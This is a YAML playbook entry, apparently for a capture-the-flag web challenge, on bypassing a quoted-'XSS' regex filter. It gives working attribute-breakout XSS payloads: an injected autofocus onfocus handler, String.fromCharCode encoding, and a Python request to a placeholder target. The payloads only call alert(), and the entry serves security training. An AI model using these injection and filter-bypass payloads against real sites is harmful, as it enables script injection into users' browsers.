name: xss_string_filter_bypass_cross10
category: web
tags: [xss, injection, attribute_injection, string_bypass, fromCharCode]
indicators:
  - "Input injected into HTML attribute: value=\"{input}\""
  - "Regex filters \"XSS\" and 'XSS' strings"
  - "Need to trigger alert('XSS')"
  - "PhantomJS validates XSS"

tricks:
  - name: "Step 1: Identify injection point"
    when: "Analyze source code"
    how: "User input inserted into input tag value attribute"
    payload: |
      <input type=text name=name value="{msg}">

  - name: "Step 2: Analyze filter rules"
    when: "Test regular XSS"
    how: "Regex [\"']XSS[\"'] removes quoted XSS strings"
    payload: |
      re.sub(r\"\"\"[\"']XSS[\"']\"\"\", \"\", msg)

  - name: "Step 3: Close attribute and inject event"
    when: "Need to execute JavaScript"
    how: "Close value attribute with quote, add event handler"
    payload: |
      " onfocus=alert(1) x="

  - name: "Step 4: Bypass XSS string filter"
    when: "alert('XSS') is filtered"
    how: "Use String.fromCharCode to construct XSS (X=88, S=83)"
    payload: |
      alert(String.fromCharCode(88,83,83))

  - name: "Step 5: Submit payload"
    when: "Execute attack"
    how: "GET request to /page with autofocus payload"
    payload: |
      payload = '" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="'
      requests.get('http://TARGET/page', params={'name': payload})
